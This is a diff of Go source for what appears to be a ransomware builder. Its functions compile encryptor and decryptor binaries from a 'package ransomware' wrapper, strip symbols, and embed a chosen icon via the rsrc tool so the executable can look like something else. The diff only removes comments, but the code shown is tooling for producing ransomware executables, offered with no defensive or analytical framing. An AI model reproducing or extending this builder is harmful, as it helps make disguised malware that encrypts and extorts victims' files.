@@ -145,7 +145,6 @@ func buildEncryptor() {
 		buildArgs = append(buildArgs, "-trimpath", "-ldflags", "-s -w")
 	}
 
-	// Create temporary main wrapper
 	tempMainContent := `package ransomware
 
 func main() {
@@ -210,7 +209,6 @@ func buildDecryptor() {
 
 	fmt.Printf("\n%s[*] Building decryptor...%s\n", utils.Yellow, utils.Reset)
 
-	// Create temporary main wrapper
 	tempMainContent := `package ransomware
 
 func main() {
@@ -318,10 +316,10 @@ func selectIcon() string {
 }
 
 func ensureRsrcInstalled() error {
-	// Check if rsrc is already installed
+
 	_, err := exec.LookPath("rsrc")
 	if err == nil {
-		return nil // rsrc is already installed
+		return nil
 	}
 
 	fmt.Printf("%s[*] Installing rsrc tool...%s\n", utils.Yellow, utils.Reset)
@@ -332,7 +330,6 @@ func ensureRsrcInstalled() error {
 		return fmt.Errorf("failed to install rsrc: %v\nOutput: %s", err, string(output))
 	}
 
-	// Verify rsrc is now available
 	_, err = exec.LookPath("rsrc")
 	if err != nil {
 		return fmt.Errorf("rsrc installed but not found in PATH. Make sure GOPATH/bin is in your PATH")
@@ -348,18 +345,15 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 		return nil
 	}
 
-	// Ensure rsrc is installed
 	if err := ensureRsrcInstalled(); err != nil {
 		return fmt.Errorf("failed to ensure rsrc is installed: %v", err)
 	}
 
-	// Validate that the image file is readable
 	_, err := os.Stat(imagePath)
 	if err != nil {
 		return fmt.Errorf("image file not found: %v", err)
 	}
 
-	// Verify it's a valid image
 	imgFile, err := os.Open(imagePath)
 	if err != nil {
 		return fmt.Errorf("failed to open image: %v", err)
@@ -371,10 +365,8 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 		return fmt.Errorf("invalid image format: %v", err)
 	}
 
-	// Create rsrc manifest with icon
 	sysoPath := "resource.syso"
 
-	// Run rsrc command to create .syso with the icon
 	cmd := exec.Command("rsrc",
 		"-arch", "amd64",
 		"-icon", imagePath,
@@ -387,14 +379,12 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 		return fmt.Errorf("rsrc command failed: %v\nOutput: %s", err, string(output))
 	}
 
-	// Verify .syso was created
 	if _, err := os.Stat(sysoPath); err != nil {
 		return fmt.Errorf("rsrc failed to create .syso file")
 	}
 
 	fmt.Printf("%s[✓] Created resource.syso%s\n", utils.Green, utils.Reset)
 
-	// Rebuild the executable to include the .syso resource
 	fmt.Printf("%s[*] Rebuilding executable with embedded resource...%s\n", utils.Yellow, utils.Reset)
 
 	exeNameNoExt := strings.TrimSuffix(exePath, ".exe")
@@ -411,7 +401,7 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 	case "decrypt":
 		sourceFile = "decrypt.go"
 	default:
-		// Try to guess, or use the provided filename
+
 		sourceFile = exeNameNoExt + ".go"
 	}
 
@@ -420,7 +410,6 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 	cmd = exec.Command("go", buildArgs...)
 	output, err = cmd.CombinedOutput()
 
-	// Always delete .syso after build attempt
 	defer func() {
 		if err := os.Remove(sysoPath); err == nil {
 			fmt.Printf("%s[✓] Cleaned up resource.syso%s\n", utils.Green, utils.Reset)
@@ -436,7 +425,7 @@ func applyIconWithRsrc(exePath, imagePath string) error {
 }
 
 func applyIcon(exePath, iconPath string) {
-	// Legacy function - now delegates to applyIconWithRsrc
+
 	if err := applyIconWithRsrc(exePath, iconPath); err != nil {
 		fmt.Printf("%s[!] Error: %v%s\n", utils.Red, err, utils.Reset)
 	}
